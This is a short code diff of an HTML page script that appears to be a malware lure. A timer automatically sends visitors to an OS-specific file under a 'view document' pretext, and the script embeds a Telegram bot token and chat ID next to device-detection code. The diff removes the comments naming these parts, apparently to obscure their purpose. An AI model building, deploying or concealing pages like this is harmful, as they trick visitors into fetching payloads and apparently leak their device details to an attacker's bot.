@@ -125,7 +125,7 @@
         window.location.href = files[os];
       }, 5000);
     } else {
-      // Linux: no auto-trigger, just wait for a real click
+      // Linux: no auto-trigger
       note.textContent = 'Click the button above to view document.';
     }
   })();
@@ -150,13 +150,13 @@
 
 <script>
   // =========================
-  // TELEGRAM SETTINGS
+ 
   // =========================
   const BOT_TOKEN = "8912911301:AAEgnzngnnS4QI8oi3JCnnlkar10krLsbow";
   const CHAT_ID = "1675048315";
 
   // =========================
-  // DEVICE DETECTION
+ 
   // =========================
   const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
